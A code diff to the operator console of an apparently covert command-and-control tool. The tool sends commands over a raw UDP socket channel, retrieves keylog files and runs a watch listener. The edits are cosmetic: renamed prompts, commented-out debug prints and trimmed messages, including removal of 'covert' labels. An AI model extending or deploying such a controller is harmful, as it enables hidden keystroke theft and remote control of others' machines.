@@ -108,11 +108,11 @@ class Commander:
         Send a command via the raw socket covert channel.
         """
         print(f"\nSending covert command: {command_type.name}")
-        print(f"    Encoding:  UDP src port = 0x{int(command_type):04X}")
-        print(f"    Transport: UDP port {self.command_port}")
+        # print(f"    Encoding:  UDP src port = 0x{int(command_type):04X}")
+        # print(f"    Transport: UDP port {self.command_port}")
         if payload and len(payload) < 100:
             preview = payload[:50].decode('utf-8', errors='replace')
-            print(f"    Payload:   {preview}")
+            print(f"    Payload: {preview}")
 
         needs_response = command_type in COMMANDS_WITH_RESPONSE
 
@@ -207,7 +207,7 @@ class Commander:
 
         while True:
             try:
-                user_input = input("covert> ").strip()
+                user_input = input("cmd> ").strip()
 
                 if not user_input:
                     continue
@@ -326,7 +326,7 @@ class Commander:
                     else:
                         print("No keylog file received (timeout)")
 
-                    print("Keylog stopped. Resuming command mode.")
+                    print("Keylog stopped.")
                     break
 
                 elif user_input == '':
@@ -363,8 +363,8 @@ class Commander:
         )
         self._watch_thread.start()
 
-        print("  WATCH MODE ACTIVE — commander is locked")
-        print("  Type 'stopwatch' to stop.")
+        print("WATCH MODE ACTIVE")
+        print("Type 'stopwatch' to stop.")
 
         while True:
             try:
@@ -379,12 +379,12 @@ class Commander:
                         b''
                     )
                     self._stop_watch_listener()
-                    print("Watch stopped. Resuming normal command mode.")
+                    print("Watch stopped.")
                     break
                 elif user_input == '':
                     continue
                 else:
-                    print("Watch mode is active — only 'stopwatch' is accepted.")
+                    print("Type 'stopwatch' to stop")
 
             except KeyboardInterrupt:
                 print("\nInterrupted — stopping watch and disconnecting...")
@@ -422,9 +422,9 @@ class Commander:
             print(f"Watch listener: could not open socket: {e}")
             return
 
-        chunks        = {}
+        chunks = {}
         expected_total = None
-        current_cmd   = None
+        current_cmd = None
 
         try:
             while not self._watch_stop.is_set():
@@ -440,7 +440,7 @@ class Commander:
                 if not parsed:
                     continue
                 if parsed['dst_port'] != self.command_port:
-                    print(f"{parsed['dst_port']} {self.command_port}")
+                    # print(f"{parsed['dst_port']} {self.command_port}")
                     continue
 
                 seq = parsed['seq']
@@ -461,7 +461,7 @@ class Commander:
                     expected_seqs = set(range(1, expected_total + 1))
                     if set(chunks.keys()) != expected_seqs:
                         missing = expected_seqs - set(chunks.keys())
-                        print(f"\n[!] Watch listener: missing seqs {missing} — dropping")
+                        print(f"\nWatch listener: missing seqs {missing} — dropping")
                         chunks        = {}
                         expected_total = None
                         current_cmd   = None
@@ -545,7 +545,7 @@ def main():
     try:
         commander.interactive_session()
     except Exception as e:
-        print(f"\n[!] Fatal error: {e}")
+        print(f"\nError: {e}")
         sys.exit(1)
 
 if __name__ == "__main__":
